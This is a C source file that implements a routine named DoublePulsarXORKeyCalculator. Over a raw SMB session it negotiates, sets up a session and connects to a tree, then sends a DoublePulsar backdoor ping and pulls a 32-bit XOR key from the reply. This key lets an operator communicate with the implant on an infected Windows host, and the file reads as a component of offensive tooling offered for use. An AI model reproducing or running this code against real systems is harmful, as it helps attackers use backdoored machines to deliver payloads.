#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int smb_send_all(SOCKET sock, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int chunk = (length - sent > (size_t)INT_MAX)
            ? INT_MAX
            : (int)(length - sent);
        int result = send(sock, (const char *)data + sent, chunk, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int smb_recv_all(SOCKET sock, uint8_t *data, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int chunk = (length - received > (size_t)INT_MAX)
            ? INT_MAX
            : (int)(length - received);
        int result = recv(sock, (char *)data + received, chunk, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    return 0;
}

static int smb_recv_frame(SOCKET sock, uint8_t **frame, size_t *frame_length)
{
    uint8_t header[4];
    size_t payload_length;
    uint8_t *buffer;

    if (smb_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];

    if (payload_length > SIZE_MAX - sizeof(header))
        return -1;

    buffer = (uint8_t *)malloc(sizeof(header) + payload_length);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (payload_length != 0 &&
        smb_recv_all(sock, buffer + sizeof(header), payload_length) != 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + payload_length;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock = INVALID_SOCKET;
    uint8_t negotiate_packet[sizeof(SMB_NEGOTIATE_PKT)];
    uint8_t session_setup_packet[sizeof(SMB_SESSION_SETUP_PKT)];
    uint8_t tree_connect_packet[sizeof(SMB_TREE_CONNECT_PKT)];
    uint8_t ping_packet[sizeof(DP_PING_PKT)];
    uint8_t *response = NULL;
    size_t response_length = 0;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t key = 0;

    if (ip == NULL || port <= 0 || port > 65535)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, sizeof(negotiate_packet));
    if (smb_send_all(sock, negotiate_packet, sizeof(negotiate_packet) - 1) != 0 ||
        smb_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, sizeof(session_setup_packet));
    if (smb_send_all(sock, session_setup_packet, sizeof(session_setup_packet) - 1) != 0 ||
        smb_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;

    if (response_length < 34)
        goto cleanup;
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, sizeof(tree_connect_packet));
    tree_connect_packet[32] = (uint8_t)(user_id & 0xff);
    tree_connect_packet[33] = (uint8_t)(user_id >> 8);
    if (smb_send_all(sock, tree_connect_packet, sizeof(tree_connect_packet) - 1) != 0 ||
        smb_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;

    if (response_length < 34)
        goto cleanup;
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));
    ping_packet[28] = (uint8_t)(tree_id & 0xff);
    ping_packet[29] = (uint8_t)(tree_id >> 8);
    ping_packet[32] = (uint8_t)(user_id & 0xff);
    ping_packet[33] = (uint8_t)(user_id >> 8);

    if (smb_send_all(sock, ping_packet, sizeof(ping_packet) - 1) != 0 ||
        smb_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;

    if (SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4 ||
        response_length < SMB_RESP_SIGNATURE_END)
        goto cleanup;

    key = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);

cleanup:
    free(response);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    return (unsigned int)key;
}